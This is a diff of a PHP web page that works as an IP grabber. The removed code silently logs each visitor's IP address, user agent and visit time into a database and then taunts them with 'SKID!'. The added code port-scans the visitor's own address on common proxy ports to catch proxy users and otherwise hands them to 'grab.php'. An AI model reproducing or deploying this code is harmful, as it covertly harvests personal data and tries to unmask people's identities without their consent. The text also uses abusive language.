@@ -1,21 +1,9 @@
-<?php 
+<?php $ports = array(8080,80,81,1080,6588,8000,3128,553,554,4480); 
+foreach($ports as $port) {
+    if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 1)) {
+        die(include('fuck.php'));
+    } else {
+        include('grab.php');
+    }
+}
 
-ob_start();
-require_once 'skid/db.php';
-
-$ip = $_SERVER['REMOTE_ADDR'];
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$timer = date('d/m/Y h:i:s a', time());
-
-$DoubleGrabVerif = $odb->prepare("SELECT COUNT(*) FROM `ips` WHERE `ip` = :ip");
-$DoubleGrabVerif->execute(array(':ip' => $ip));
-$IpAlreadyGrabbed = $DoubleGrabVerif->fetchColumn(0);
-if($IpAlreadyGrabbed > 0){$IpAlreadyGrabbedFuck = ':(';die($IpAlreadyGrabbedFuck);}
-$ipp = $odb->prepare("INSERT INTO `ips` VALUES(:ip, :UA, :Time)");
-$ipp->execute(array(':ip' => $ip, ':UA' => $user_agent, ':Time' => $timer));
-$fuckyou = "No luck grabbed!";
-?>
-<script>
-	alert('<?php echo "$fuckyou" ?>')
-</script>
-HAHAHAHAHA SKID!
